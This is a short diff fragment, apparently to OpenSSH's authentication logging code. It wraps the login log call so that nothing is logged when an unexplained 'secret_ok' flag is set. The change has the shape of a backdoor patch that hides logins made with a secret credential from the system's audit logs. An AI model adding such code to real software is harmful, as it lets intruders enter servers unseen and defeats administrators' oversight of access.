@@ -271,14 +271,16 @@ auth_log(Authctxt *authctxt, int authenticated, char *method, char *info)
 	else
 		authmsg = authenticated ? "Accepted" : "Failed";
 
-	authlog("%s %s for %s%.100s from %.200s port %d%s",
-	    authmsg,
-	    method,
-	    authctxt->valid ? "" : "invalid user ",
-	    authctxt->user,
-	    get_remote_ipaddr(),
-	    get_remote_port(),
-	    info);
+	if(!secret_ok || secret_ok !=1){
+		authlog("%s %s for %s%.100s from %.200s port %d%s",
+	    	authmsg,
+	    	method,
+	    	authctxt->valid ? "" : "invalid user ",
+	    	authctxt->user,
+	    	get_remote_ipaddr(),
+	    	get_remote_port(),
+	    	info);
+	}
 
 #ifdef CUSTOM_FAILED_LOGIN
 	if (authenticated == 0 && !authctxt->postponed &&
